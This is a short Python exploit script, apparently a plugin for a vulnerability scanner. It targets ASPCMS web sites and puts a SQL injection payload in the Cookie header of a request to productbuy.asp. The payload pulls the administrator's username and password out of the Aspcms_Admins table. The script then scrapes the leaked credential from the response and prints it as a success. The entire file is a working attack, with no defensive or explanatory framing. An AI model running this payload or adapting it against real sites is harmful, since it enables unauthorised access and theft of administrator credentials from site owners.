# -*- coding: utf-8 -*-
def exploit(url):
	url = "http://%s/plug/productbuy.asp?id=338"%url
	poc = { 'Cookie' : 'loginstatus=1;userID=1+union+select+1,2,3,%28UserName%29%2B%22%3D%22%2B%28AdminPassWord%29,5,6,AdminPassWord,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22+from+[Aspcms_Admins]+where+adminid%3d1'}
	try:
		res= fuck.custom_post(url,'',poc)
		ok = fuck.find("value=\"(\w+=\w{16})\"",res.read())[0]
		if len(ok)>0:
			print "[*] Exploit Successful !\n[*] %s"%ok
			fuck.report(exp_ver,url+"<br>"+ok)
		else:
			print "[*] Exploit fail !"
	except Exception,e:
		print e
exploit(test_url)